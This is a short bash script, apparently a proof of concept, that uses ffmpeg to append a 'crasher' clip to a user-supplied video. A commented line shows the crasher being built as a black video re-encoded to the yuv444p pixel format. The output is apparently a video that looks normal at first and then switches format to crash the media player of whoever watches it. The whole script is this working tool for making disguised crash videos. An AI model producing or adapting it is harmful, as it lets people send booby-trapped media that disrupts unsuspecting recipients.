#!/bin/bash

echo "Compiling video $1 with crasher to output video $2"
ffmpeg -i $1 "crashers/newvideo2.mp4"
#ffmpeg -i black.mp4 -pix_fmt yuv444p "crashers/newvideo.mp4"
# I'm not sure why but i dont want to break it will test more soon.
echo "file crashers/newvideo2.mp4\nfile crashers/newvideo.mp4" > crasher.txt
ffmpeg -f concat -safe 0 -y -i "crasher.txt" -codec copy $2 # Allows me to overwrite 
# Atm can only do a single file at a time
# Need to really change this code to do multiple
# This whole thing is more a proof of concept tho
rm crasher.txt
rm crashers/newvideo2.mp4
echo "Goodbye."